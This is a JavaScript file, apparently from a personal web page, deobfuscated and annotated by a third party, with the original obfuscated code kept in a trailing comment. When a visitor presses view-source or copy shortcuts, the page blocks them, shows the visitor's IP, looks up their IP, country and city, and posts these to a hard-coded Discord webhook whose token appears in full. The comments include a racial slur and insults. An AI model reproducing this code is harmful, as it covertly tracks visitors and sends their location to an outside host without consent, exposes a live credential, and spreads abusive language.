/* Anti-Skid Protection if you manage to deobfuscate this keep it for yourself! 
^(DISCLAIMER) Anti-Skid protection was too shitty */
// dumped @ adri.cfd

var _0x3badbd = _0x493f
;(function (_0x266671, _0x4f544d) {
  var _0x4685c7 = _0x266671()
  while (true) {
    try {
      var _0x29b4cf =
        parseInt(_0x493f(228)) / 1 +
        parseInt(_0x493f(248)) / 2 +
        parseInt(_0x493f(271)) / 3 +
        (-parseInt(_0x493f(242)) / 4) * (-parseInt(_0x493f(259)) / 5) +
        (-parseInt(_0x493f(229)) / 6) * (parseInt(_0x493f(272)) / 7) +
        (-parseInt(_0x493f(250)) / 8) * (parseInt(_0x493f(237)) / 9) +
        (parseInt(_0x493f(236)) / 10) * (parseInt(_0x493f(234)) / 11)
      if (_0x29b4cf === _0x4f544d) {
        break
      } else {
        _0x4685c7.push(_0x4685c7.shift())
      }
    } catch (_0x4676ca) {
      _0x4685c7.push(_0x4685c7.shift())
    }
  }
})(_0x9837, 157016)
function noskidz() {
  async function _0x23ed27() {
    try {
      const _0x620711 = await fetch('https://ipinfo.io/json')
      if (!_0x620711.ok) {
        return {
          ip: 'Unknown',
          country: 'Unknown',
          city: 'Unknown',
        }
      }
      const _0x31effa = await _0x620711.json()
      return {
        ip: _0x31effa.ip || 'Unknown',
        country: _0x31effa.country || 'Unknown',
        city: _0x31effa.city || 'Unknown',
      }
    } catch (_0x44f3c2) {
      return {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
      }
    }
  }
  // as useless as my man's life :sob:
  _0x23ed27().then((_0x480b1c) => {
    const _0x36e9b8 = {
      embeds: [
        {
          color: 16579836,
          fields: [
            {
              name: 'IP:',
              value: _0x480b1c.ip,
            },
            {
              name: 'Country:',
              value: _0x480b1c.country,
            },
            {
              name: 'City:',
              value: _0x480b1c.city,
            },
          ],
        },
      ],
    }
    fetch(
      'https://discord.com/api/webhooks/1149637678573301840/qMRF-buO1bMPKnYFA2AvTragKq1c7m9LtHczF9bxsJAE4RdHyB8Jp_NbmLt5FFaA-60A',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(_0x36e9b8),
      }
    )
  })
}
fetch('https://api.ipify.org?format=json') // bro fetching 2 apis for the same purpose
  .then((_0x1850bd) => _0x1850bd.json())
  .then((_0x3c55a8) => {
    var _0x546cf0 = _0x3c55a8.ip
    window.addEventListener('keydown', (_0x5ca9cf) => {
      _0x5ca9cf.ctrlKey &&
        (_0x5ca9cf.key === 'S' || _0x5ca9cf.key === 's') &&
        (_0x5ca9cf.preventDefault(),
        alert('NUH UH SKID, This is your IP: ' + _0x546cf0), // bypassable
        noskidz())
      _0x5ca9cf.ctrlKey &&
        _0x5ca9cf.key === 'C' &&
        (_0x5ca9cf.preventDefault(),
        alert('NUH UH SKID, This is your IP: ' + _0x546cf0), // bypassable
        noskidz())
      _0x5ca9cf.ctrlKey &&
        (_0x5ca9cf.key === 'E' || _0x5ca9cf.key === 'e') &&
        (_0x5ca9cf.preventDefault(),
        alert('NUH UH SKID, This is your IP: ' + _0x546cf0), // bypassable
        noskidz())
      _0x5ca9cf.ctrlKey &&
        (_0x5ca9cf.key === 'I' ||
          _0x5ca9cf.key === 'i' ||
          _0x5ca9cf.key === 'Ã\u201EÂ\xB1') &&
        (_0x5ca9cf.preventDefault(),
        alert('NUH UH SKID, This is your IP: ' + _0x546cf0), // bypassable
        noskidz())
      _0x5ca9cf.ctrlKey &&
        (_0x5ca9cf.key === 'K' || _0x5ca9cf.key === 'k') &&
        (_0x5ca9cf.preventDefault(),
        alert('NUH UH SKID, This is your IP: ' + _0x546cf0), // bypassable
         // bypasses for the shit above
         /*
         A. click ctrl u or wtv key bind that is prevented by an alert for 2 times and it will be bypassed :troll:*/
         /*
         // B. Bypass with javascript, made @ adri.cfd
         const oldPrototype = window.alert;
         window.alert = function (text) {
          console.log(text); 
          if(!text.includes("YOUR IP"))
            oldPrototype(text); 
          return true; // lets you processed the event he was trying to prevent
      };
        */
        noskidz())
      _0x5ca9cf.ctrlKey &&
        (_0x5ca9cf.key === 'U' || _0x5ca9cf.key === 'u') &&
        (_0x5ca9cf.preventDefault(), 
        alert('NUH UH SKID, This is your IP: ' + _0x546cf0),
        noskidz())
    })
    document.addEventListener('contextmenu', function (_0x425474) {
      _0x425474.preventDefault()
    })
  })
var removed = false,
  audio = null
function _0x493f(_0x589a53, _0x47e843) {
  var _0x59cac4 = _0x9837()
  _0x493f = function (_0xfc70f, _0x116563) {
    _0xfc70f = _0xfc70f - 227
    var _0x12cbca = _0x59cac4[_0xfc70f]
    return _0x12cbca
  }
  return _0x493f(_0x589a53, _0x47e843)
}
function enter() {
  var _0x3eb794 = document.getElementById('clickimage')
  if (_0x3eb794) {
    _0x3eb794.classList.add('fade-out') // does this nigga know a better thing can be done with css ?
    !audio &&
      ((audio = new Audio('files/audio.mp3')),
      (audio.volume = 0.1),
      (audio.loop = true),
      audio.play())
    var _0x4e0e19 = 0,
      _0x48992a = setInterval(function () {
        _0x4e0e19 += 10
        var _0x571be9 = 0.1 + (_0x4e0e19 / 300) * 0.19999999999999998
        audio.volume = _0x571be9
        _0x4e0e19 >= 300 && clearInterval(_0x48992a)
      }, 10)
    setTimeout(function () {
      _0x3eb794.style.display = 'none'
    }, 300)
  }
}
const titles = ['@8fza', 'Do not skid me!', '@8fza', 'blades.gay']
function fhfhrrz() {
  document.title = titles[Math.floor(Math.random() * titles.length)]
}
function _0x9837() {
  var _0x97bf0 = [
    'display',
    'https://api.ipify.org?format=json',
    'https://discord.com/api/webhooks/1149637678573301840/qMRF-buO1bMPKnYFA2AvTragKq1c7m9LtHczF9bxsJAE4RdHyB8Jp_NbmLt5FFaA-60A', // funny
    'blades.gay',
    'add',
    'getElementById',
    'IP:',
    'Do not skid me!',
    'getElementsByTagName',
    '111486nQxSUy',
    '3031ShvoUo',
    'then',
    'contextmenu',
    '151147USXYqe',
    '2364xoKEOB',
    'NUH UH SKID, This is your IP: ',
    'style',
    'json',
    'Country:',
    '176kRrmAv',
    'floor',
    '95610dICIJD',
    '5913CHmwHB',
    'length',
    'volume',
    'play',
    '@8fza',
    '55372DtJyxn',
    'body',
    'keydown',
    'loop',
    'key',
    'classList',
    '156534pnIQdc',
    'stringify',
    '1288SoSLmE',
    '@8fza',
    'POST',
    'Unknown',
    'addEventListener',
    'preventDefault',
    'country',
    'city',
    'title',
    '5iRSXrp',
    'ctrlKey',
    'clickimage',
  ]
  _0x9837 = function () {
    return _0x97bf0
  }
  return _0x9837()
}
setInterval(fhfhrrz, 1000)
fhfhrrz()

/*
function _0x3693(){var _0x2ed9a6=['none','5913CHmwHB','1918EGGZjG','city','style','City:','title','classList','18336uPlYVs','176kRrmAv','addEventListener','preventDefault','@8fza','1601208xKhMCF','shift','body','key','json','5iRSXrp','length','add','798540mQmIuK','ctrlKey','fade-out','NUH\x20UH\x20SKID,\x20This\x20is\x20your\x20IP:\x20','\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0031\u0034\u0039\u0036\u0033\u0037\u0036\u0037\u0038\u0035\u0037\u0033\u0033\u0030\u0031\u0038\u0034\u0030\u002f\u0071\u004d\u0052\u0046\u002d\u0062\u0075\u004f\u0031\u0062\u004d\u0050\u004b\u006e\u0059\u0046\u0041\u0032\u0041\u0076\u0054\u0072\u0061\u0067\u004b\u0071\u0031\u0063\u0037\u006d\u0039\u004c\u0074\u0048\u0063\u007a\u0046\u0039\u0062\u0078\u0073\u004a\u0041\u0045\u0034\u0052\u0064\u0048\u0079\u0042\u0038\u004a\u0070\u005f\u004e\u0062\u006d\u004c\u0074\u0035\u0046\u0046\u0061\u0041\u002d\u0036\u0030\u0041','stringify','2364xoKEOB','195150VHRZMh','2776764cscRgE','Unknown','3031ShvoUo','display','blades.gay','815621xuaIlP','151147USXYqe','111486nQxSUy','contextmenu','\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u0070\u0069\u002e\u0069\u0070\u0069\u0066\u0079\u002e\u006f\u0072\u0067\u003f\u0066\u006f\u0072\u006d\u0061\u0074\u003d\u006a\u0073\u006f\u006e','clickimage','volume','\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0069\u0070\u0069\u006e\u0066\u006f\u002e\u0069\u006f\u002f\u006a\u0073\u006f\u006e','\u0050\u004f\u0053\u0054','then','\u0049\u0050\u003a','country','Ã„Â±','play','getElementById','\u0040\u0038\u0066\u007a\u0061','floor','Do\x20not\x20skid\x20me!','push','912597KlRmZr','156534pnIQdc','files/audio.mp3','loop'];_0x3693=function(){return _0x2ed9a6;};return _0x3693();}function _0x5085(_0x284240,_0x2f0057){var _0x36934d=_0x3693();return _0x5085=function(_0x508583,_0x5c3b13){_0x508583=_0x508583-0x1e1;var _0xed2b55=_0x36934d[_0x508583];return _0xed2b55;},_0x5085(_0x284240,_0x2f0057);}var _0x202262=_0x5085;(function(_0x545750,_0x1fa5c5){var _0xf31f04=_0x5085,_0x4736ba=_0x545750();while(!![]){try{var _0x21f530=-parseInt(_0xf31f04(0x1f3))/0x1+-parseInt(_0xf31f04(0x1ed))/0x2+-parseInt(_0xf31f04(0x206))/0x3+parseInt(_0xf31f04(0x217))/0x4+parseInt(_0xf31f04(0x1e6))/0x5+parseInt(_0xf31f04(0x1ee))/0x6+-parseInt(_0xf31f04(0x20c))/0x7*(-parseInt(_0xf31f04(0x212))/0x8);if(_0x21f530===_0x1fa5c5)break;else _0x4736ba['push'](_0x4736ba['shift']());}catch(_0x1075e9){_0x4736ba['push'](_0x4736ba['shift']());}}}(_0x3693,0x69d09));var _0x3badbd=_0x493f;(function(_0x266671,_0x4f544d){var _0x27cfad=_0x5085,_0x4685c7=_0x266671();while(!![]){try{var _0x29b4cf=parseInt(_0x493f(0xe4))/0x1+parseInt(_0x493f(0xf8))/0x2+parseInt(_0x493f(0x10f))/0x3+-parseInt(_0x493f(0xf2))/0x4*(-parseInt(_0x493f(0x103))/0x5)+-parseInt(_0x493f(0xe5))/0x6*(parseInt(_0x493f(0x110))/0x7)+-parseInt(_0x493f(0xfa))/0x8*(parseInt(_0x493f(0xed))/0x9)+parseInt(_0x493f(0xec))/0xa*(parseInt(_0x493f(0xea))/0xb);if(_0x29b4cf===_0x4f544d)break;else _0x4685c7[_0x27cfad(0x205)](_0x4685c7[_0x27cfad(0x218)]());}catch(_0x4676ca){_0x4685c7[_0x27cfad(0x205)](_0x4685c7[_0x27cfad(0x218)]());}}}(_0x9837,0x26558));function noskidz(){var _0x55a154=_0x5085;async function _0x23ed27(){var _0x399b39=_0x5085;try{const _0x620711=await fetch(_0x399b39(0x1fa));if(!_0x620711['ok'])return{'ip':_0x399b39(0x1ef),'country':_0x399b39(0x1ef),'city':_0x399b39(0x1ef)};const _0x31effa=await _0x620711[_0x399b39(0x1e2)]();return{'ip':_0x31effa['ip']||'Unknown','country':_0x31effa['country']||_0x399b39(0x1ef),'city':_0x31effa[_0x399b39(0x20d)]||_0x399b39(0x1ef)};}catch(_0x44f3c2){return{'ip':'Unknown','country':_0x399b39(0x1ef),'city':_0x399b39(0x1ef)};}}_0x23ed27()[_0x55a154(0x1fc)](_0x480b1c=>{var _0x2149ae=_0x55a154;const _0x36e9b8={'embeds':[{'color':0xfcfcfc,'fields':[{'name':_0x2149ae(0x1fd),'value':_0x480b1c['ip']},{'name':'Country:','value':_0x480b1c['country']},{'name':_0x2149ae(0x20f),'value':_0x480b1c[_0x2149ae(0x20d)]}]}]};fetch(_0x2149ae(0x1ea),{'method':_0x2149ae(0x1fb),'headers':{'Content-Type':'application/json'},'body':JSON[_0x2149ae(0x1eb)](_0x36e9b8)});});}fetch(_0x202262(0x1f7))['then'](_0x1850bd=>_0x1850bd[_0x202262(0x1e2)]())[_0x202262(0x1fc)](_0x3c55a8=>{var _0x5ec2fe=_0x202262,_0x546cf0=_0x3c55a8['ip'];window[_0x5ec2fe(0x214)]('keydown',_0x5ca9cf=>{var _0x336547=_0x5ec2fe;_0x5ca9cf[_0x336547(0x1e7)]&&(_0x5ca9cf[_0x336547(0x1e1)]==='S'||_0x5ca9cf['key']==='s')&&(_0x5ca9cf['preventDefault'](),alert(_0x336547(0x1e9)+_0x546cf0),noskidz()),_0x5ca9cf[_0x336547(0x1e7)]&&_0x5ca9cf[_0x336547(0x1e1)]==='C'&&(_0x5ca9cf['preventDefault'](),alert('NUH\x20UH\x20SKID,\x20This\x20is\x20your\x20IP:\x20'+_0x546cf0),noskidz()),_0x5ca9cf[_0x336547(0x1e7)]&&(_0x5ca9cf[_0x336547(0x1e1)]==='E'||_0x5ca9cf[_0x336547(0x1e1)]==='e')&&(_0x5ca9cf[_0x336547(0x215)](),alert(_0x336547(0x1e9)+_0x546cf0),noskidz()),_0x5ca9cf[_0x336547(0x1e7)]&&(_0x5ca9cf[_0x336547(0x1e1)]==='I'||_0x5ca9cf['key']==='i'||_0x5ca9cf[_0x336547(0x1e1)]===_0x336547(0x1ff))&&(_0x5ca9cf[_0x336547(0x215)](),alert('NUH\x20UH\x20SKID,\x20This\x20is\x20your\x20IP:\x20'+_0x546cf0),noskidz()),_0x5ca9cf['ctrlKey']&&(_0x5ca9cf[_0x336547(0x1e1)]==='K'||_0x5ca9cf[_0x336547(0x1e1)]==='k')&&(_0x5ca9cf['preventDefault'](),alert('NUH\x20UH\x20SKID,\x20This\x20is\x20your\x20IP:\x20'+_0x546cf0),noskidz()),_0x5ca9cf[_0x336547(0x1e7)]&&(_0x5ca9cf['key']==='U'||_0x5ca9cf[_0x336547(0x1e1)]==='u')&&(_0x5ca9cf[_0x336547(0x215)](),alert(_0x336547(0x1e9)+_0x546cf0),noskidz());}),document['addEventListener'](_0x5ec2fe(0x1f6),function(_0x425474){var _0x475899=_0x5ec2fe;_0x425474[_0x475899(0x215)]();});});var removed=![],audio=null;function _0x493f(_0x589a53,_0x47e843){var _0x59cac4=_0x9837();return _0x493f=function(_0xfc70f,_0x116563){_0xfc70f=_0xfc70f-0xe3;var _0x12cbca=_0x59cac4[_0xfc70f];return _0x12cbca;},_0x493f(_0x589a53,_0x47e843);}function enter(){var _0x4c2062=_0x202262,_0x3eb794=document[_0x4c2062(0x201)](_0x4c2062(0x1f8));if(_0x3eb794){_0x3eb794[_0x4c2062(0x211)]['add'](_0x4c2062(0x1e8));!audio&&(audio=new Audio(_0x4c2062(0x208)),audio[_0x4c2062(0x1f9)]=0.1,audio[_0x4c2062(0x209)]=!![],audio['play']());var _0x4e0e19=0x0,_0x48992a=setInterval(function(){var _0x1834be=_0x4c2062;_0x4e0e19+=0xa;var _0x571be9=0.1+_0x4e0e19/0x12c*0.19999999999999998;audio[_0x1834be(0x1f9)]=_0x571be9,_0x4e0e19>=0x12c&&clearInterval(_0x48992a);},0xa);setTimeout(function(){var _0x1588cb=_0x4c2062;_0x3eb794['style']['display']=_0x1588cb(0x20a);},0x12c);}}const titles=[_0x202262(0x202),_0x202262(0x204),_0x202262(0x216),_0x202262(0x1f2)];function fhfhrrz(){var _0xa39326=_0x202262;document[_0xa39326(0x210)]=titles[Math[_0xa39326(0x203)](Math['random']()*titles[_0xa39326(0x1e4)])];}function _0x9837(){var _0xcf3b9c=_0x202262,_0x97bf0=[_0xcf3b9c(0x1f1),_0xcf3b9c(0x1f7),_0xcf3b9c(0x1ea),_0xcf3b9c(0x1f2),_0xcf3b9c(0x1e5),_0xcf3b9c(0x201),_0xcf3b9c(0x1fd),_0xcf3b9c(0x204),'getElementsByTagName',_0xcf3b9c(0x1f5),_0xcf3b9c(0x1f0),_0xcf3b9c(0x1fc),_0xcf3b9c(0x1f6),_0xcf3b9c(0x1f4),_0xcf3b9c(0x1ec),'NUH\x20UH\x20SKID,\x20This\x20is\x20your\x20IP:\x20',_0xcf3b9c(0x20e),'json','Country:',_0xcf3b9c(0x213),'floor','95610dICIJD',_0xcf3b9c(0x20b),_0xcf3b9c(0x1e4),_0xcf3b9c(0x1f9),_0xcf3b9c(0x200),_0xcf3b9c(0x216),'55372DtJyxn',_0xcf3b9c(0x219),'keydown',_0xcf3b9c(0x209),_0xcf3b9c(0x1e1),_0xcf3b9c(0x211),_0xcf3b9c(0x207),_0xcf3b9c(0x1eb),'1288SoSLmE','@8fza',_0xcf3b9c(0x1fb),_0xcf3b9c(0x1ef),_0xcf3b9c(0x214),_0xcf3b9c(0x215),_0xcf3b9c(0x1fe),'city',_0xcf3b9c(0x210),_0xcf3b9c(0x1e3),_0xcf3b9c(0x1e7),'clickimage'];return _0x9837=function(){return _0x97bf0;},_0x9837();}setInterval(fhfhrrz,0x3e8),fhfhrrz();
*/
